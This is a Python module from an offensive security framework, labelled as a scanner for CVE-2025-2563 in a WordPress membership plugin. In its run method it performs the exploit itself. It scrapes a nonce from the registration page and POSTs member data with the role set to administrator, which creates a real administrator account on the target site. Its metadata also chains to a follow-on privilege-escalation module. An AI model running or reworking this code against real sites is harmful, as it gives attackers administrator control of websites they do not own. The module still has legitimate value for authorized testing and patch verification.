#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""User Registration & Membership <= 4.1.1 role injection (CVE-2025-2563)."""

import json
import re
import secrets
from datetime import date

from kittysploit import *
from lib.protocols.http.http_client import Http_client
from lib.protocols.http.wordpress import Wordpress

_PLUGIN = "user-registration"
_VULN_HIGH = (4, 1, 1)


class Module(Scanner, Http_client, Wordpress):
    __info__ = {
        "name": "User Registration CVE-2025-2563 detect",
        "description": (
            "Detects CVE-2025-2563 (<= 4.1.1): user_registration_membership_register_member "
            "accepts role=administrator in members_data JSON."
        ),
        "author": ["KittySploit Team"],
        "severity": "critical",
        "cve": "CVE-2025-2563",
        "references": ["https://nvd.nist.gov/vuln/detail/CVE-2025-2563"],
        "modules": ["auxiliary/admin/http/user_registration_cve_2025_2563_privesc"],
        "tags": ["web", "scanner", "wordpress", "user-registration", "cve-2025-2563"],
        "agent": {
            "risk": "active",
            "approval_required": True,
            "produces": ["risk_signals"],
            "chain": {
                "suggested_followups": ["auxiliary/admin/http/user_registration_cve_2025_2563_privesc"],
            },
        },
    }

    base_path = OptString("/", "WordPress base path", required=False)
    registration_path = OptString("/membership-registration/", "Membership registration page", required=False)

    def _base(self) -> str:
        return self.wp_normalize_base_path(self.base_path or "/")

    def _join(self, suffix: str) -> str:
        root = self._base()
        if not suffix.startswith("/"):
            suffix = "/" + suffix
        return f"{root}{suffix}" if root != "/" else suffix

    def run(self):
        version = self.wp_plugin_version(_PLUGIN, self._base()) or ""
        if version and not self.wp_version_in_range(version, (0, 0, 0), _VULN_HIGH):
            return False
        page = self.http_request(
            method="GET",
            path=self._join((self.registration_path or "/membership-registration/").strip()),
            allow_redirects=True,
        )
        if not page or page.status_code != 200:
            return False
        body = page.text or ""
        loc = re.search(r'ur_membership_frontend_localized_data = \{"_nonce":"([^"]+)"', body)
        if not loc:
            return False
        user = f"ks{secrets.token_hex(3)}"
        members = json.dumps(
            {
                "membership": "1",
                "payment_method": "free",
                "start_date": date.today().isoformat(),
                "username": user,
                "role": "administrator",
            },
            separators=(",", ":"),
        )
        post = self.http_request(
            method="POST",
            path=self._join("/wp-admin/admin-ajax.php"),
            headers={"Content-Type": "application/x-www-form-urlencoded"},
            data={
                "action": "user_registration_membership_register_member",
                "security": loc.group(1),
                "members_data": members,
            },
            allow_redirects=False,
        )
        if not post or post.status_code != 200:
            return False
        text = post.text or ""
        if "New member has been successfully created" in text and '"success":true' in text.replace(" ", ""):
            self.set_info(
                severity="critical",
                reason="CVE-2025-2563 — administrator role accepted in members_data",
                path="/wp-admin/admin-ajax.php",
                cve="CVE-2025-2563",
            )
            return True
        return False
